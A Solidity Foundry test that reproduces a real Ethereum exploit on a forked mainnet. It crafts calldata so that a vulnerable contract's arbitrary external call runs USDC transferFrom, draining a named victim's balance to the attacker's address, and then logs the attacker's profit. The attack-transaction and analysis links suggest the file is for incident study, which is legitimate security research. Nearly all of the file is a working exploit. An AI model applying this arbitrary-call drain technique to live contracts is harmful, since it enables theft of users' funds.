// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Attacker: 0xae39a6c2379bef53334ea968f4c711c8cf3898b6
// Vulnerable Contract: 0x0ad8229d4bc84135786ae752b9a9d53392a8afd4
// Attack Tx: https://phalcon.blocksec.com/tx/eth/0x674f74b30a3d7bdf15fa60a7c29d96a402ea894a055f624164a8009df98386a0
//            https://etherscan.io/tx/0x674f74b30a3d7bdf15fa60a7c29d96a402ea894a055f624164a8009df98386a0

// @Analysis
// https://twitter.com/Supremacy_CA/status/1590337718755954690

contract Exploit is Test {
    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address private constant vulnerableContract = 0x0AD8229D4bC84135786AE752B9A9D53392A8afd4;
    address private constant attacker = 0xAE39A6c2379BEF53334EA968F4c711c8CF3898b6;
    address private constant victim = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;

    function testHack() external {
        vm.createSelectFork("https://rpc.builder0x69.io", 15_926_096);

        // use these tools to decode raw calldata: https://www.ethcmd.com/tools/decode-calldata/  +  https://calldata-decoder.apoorv.xyz/
        bytes memory payload = abi.encodeWithSelector(
            0x090f88ca,
            address(USDC),
            address(WETH),
            0, // ?
            1, // ?
            abi.encodeWithSelector(IERC20.transferFrom.selector, victim, attacker, USDC.balanceOf(victim))
        );

        vulnerableContract.call(payload);

        console.log("Attacker's profit: %s USDC", USDC.balanceOf(attacker) / 1e6);
    }
}

/* -------------------- Interface -------------------- */
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function deliver(uint256 tAmount) external;
}

interface WETH9 {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}
